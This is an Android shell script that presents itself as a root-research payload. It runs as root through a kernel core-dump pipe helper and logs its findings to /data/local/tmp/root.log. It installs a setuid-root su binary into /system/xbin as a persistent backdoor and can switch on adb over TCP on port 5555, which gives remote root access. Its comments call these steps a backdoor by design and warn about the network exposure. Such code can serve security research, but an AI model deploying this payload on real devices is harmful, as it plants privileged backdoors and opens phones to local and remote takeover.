#!/system/bin/sh
# SPDX-License-Identifier: MIT
#
# Runs as root because the kernel's core-dump pipe helper, configured via
# core_pattern by run.sh, is spawned with full privileges.  It has no usable
# stdin/stdout, so it writes its findings to /data/local/tmp/root.log.
#
# What it does (research payload):
#   * installs a setuid-root su from /data/local/tmp/su, so later shells can
#     escalate locally
#   * optionally enables adb over TCP (port 5555) for remote access
#
# SECURITY WARNING: this is a backdoor by design. The setuid su is local, but
# adb over TCP listens on the network and gives remote root access. adb TCP is
# OFF unless /data/local/tmp/ENABLE_ADB_TCP exists. Enable it only on an
# isolated network, and follow README "Cleanup after root research" afterwards.

exec </dev/null
LOG=/data/local/tmp/root.log
exec >$LOG 2>&1

echo "=== core_pattern helper ==="
date 2>/dev/null
id
echo "selinux: $(getenforce 2>/dev/null) / $(cat /sys/fs/selinux/enforce 2>/dev/null)"
echo "context: $(cat /proc/self/attr/current 2>/dev/null)"

# 1) adb over TCP is opt-in: it exposes a root shell to the LAN.
if [ -f /data/local/tmp/ENABLE_ADB_TCP ]; then
    setprop service.adb.tcp.port 5555
    setprop persist.adb.tcp.port 5555
    echo "adb over TCP: ENABLED on port 5555"
    echo "  service.adb.tcp.port = $(getprop service.adb.tcp.port)"
    echo "  persist.adb.tcp.port = $(getprop persist.adb.tcp.port)"
    echo "  remove /data/local/tmp/ENABLE_ADB_TCP and clear the props to disable"
else
    echo "adb over TCP: skipped (create /data/local/tmp/ENABLE_ADB_TCP to enable)"
fi

# 2) setuid-root su, so `adb shell su` works from now on (local backdoor)
if [ -f /data/local/tmp/su ]; then
    echo "installing setuid-root su at /system/xbin/su (local privilege escalation)"
    mount -o rw,remount /system 2>/dev/null
    cp /data/local/tmp/su /system/xbin/su
    chown 0:0 /system/xbin/su
    chmod 6755 /system/xbin/su
    ls -l /system/xbin/su
else
    echo "setuid su: skipped (/data/local/tmp/su not found)"
fi

echo "=== done ==="
